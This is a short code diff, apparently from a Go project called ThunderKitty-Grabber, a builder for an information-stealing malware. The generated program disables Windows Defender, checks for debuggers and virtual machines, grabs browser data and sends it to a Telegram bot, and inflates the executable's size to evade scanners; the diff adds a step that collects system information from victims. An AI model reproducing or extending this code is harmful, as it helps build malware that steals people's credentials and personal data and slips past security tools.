@@ -19,6 +19,7 @@ func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFak
 package main
 
 import (
+	"ThunderKitty-Grabber/utils/sysinfo"
 	"ThunderKitty-Grabber/utils/antidbgandvm"
 	"ThunderKitty-Grabber/utils/fakeerror"
 	"ThunderKitty-Grabber/utils/browsers"
@@ -56,6 +57,9 @@ func main() {
 
 	Exclude.FileExtensions()
 	Defender.Disable()
+
+	SysInfo.Fetch()
+
 	if %t {
 		browsers.ThunderKittyGrab(telebottoken, telechatid)
 	} else {
@@ -204,7 +208,7 @@ func main() {
 			if err != nil {
 				panic(err)
 			}
-			
+
 			pumpExecutable("main.exe", pumpSize)
 		}
 	})
